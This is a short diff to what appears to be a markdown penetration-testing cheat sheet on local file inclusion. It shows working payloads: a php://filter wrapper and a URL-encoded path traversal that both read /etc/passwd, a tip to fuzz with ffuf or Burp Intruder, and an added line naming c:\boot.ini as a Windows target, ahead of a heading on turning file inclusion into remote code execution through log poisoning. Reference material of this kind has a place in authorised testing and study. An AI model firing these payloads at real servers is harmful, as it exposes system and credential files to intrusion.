@@ -13,6 +13,9 @@ php://filter/convert.base64-encode/resource=/etc/passwd
 http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
 
 # If site return error code on fail, use ffuf or burp intruder
+
+c:\boot.ini for windows
+
 ```
 
 ## LFI to RCE - Log Poisoning
